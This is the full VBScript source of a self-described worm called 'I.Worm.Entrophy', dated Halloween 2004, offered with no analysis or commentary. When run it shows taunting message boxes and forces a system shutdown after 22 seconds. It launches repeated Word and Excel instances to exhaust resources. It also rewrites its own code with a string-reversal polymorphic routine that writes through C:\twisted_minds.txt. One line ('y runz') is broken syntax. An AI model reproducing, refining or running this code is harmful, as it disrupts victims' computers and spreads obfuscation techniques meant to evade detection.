msgbox "By The Time you read this it is already to late,  for your computer has succumbed to the " & vbcrlf & "" & vbcrlf & "entrophy..." & vbcrlf & "" & vbcrlf & "You are now infected by:" & vbcrlf & "" & vbcrlf & "I.Worm.Entrophy by -=[Azag-TH0TH]=-" & vbcrlf & "(c) Halloween Oct.31, 2004." & vbcrlf & "", VBCritical,"I.Worm.Entrophy"
On Error Resume Next
Dim oShell
Set oShell = WScript.CreateObject ("WScript.shell")
msgbox"-=[Azag-TH0TH]=- Says ur PC is lookin' sleeeepy....sleeeeeepy.....G'nite MuWHAHAHAH"
oShell.run "cmd /K shutdown -s -t 22"
oShell.run=True
If True Then
End If
for i = 1 to 22
Set w = CreateObject("Word.application")
Set e = CreateObject("ExCeL.application")
next
y runz
set fso = createobject("scripting.filesystemobject")
set op = fso.opentextfile(wscript.scriptfullname,1)
set parser = fso.Createtextfile("C:\twisted_minds.txt",true)
do while mark <> "'Entropherion"
  mark = op.readline
  for i = 1 to len(mark)

      c = mid(mark,i,1)
      if c = chr(34) then
          Call Poly
      else
          parser.write c
      end if

      if i = len(mark) then
          parser.write vbcrlf
      end if
  next
loop

sub Poly()
Counter = i
do while enc <> chr(34)
  Counter = Counter + 1
  enc = mid(mark,Counter,1)
  if enc = chr(34) then exit do
      char = char & enc
loop
all = "decrypt(" & chr(34) & strreverse(char) & chr(34) & ")"
parser.write all
i = Counter
end sub
op.close
parser.close
set back = fso.opentextfile("C:\twisted_minds.txt",1)
reader = back.readall
set wrtall = fso.Createtextfile("C:\twisted_minds.txt",true)
wrtall.write reader
wrtall.writeline "function decrypt(x)" & vbcrlf & "Decrypt = strreverse(x):end function"
fso.copyfile "C:\twisted_minds.txt",wscript.scriptfullname
'Entropherion

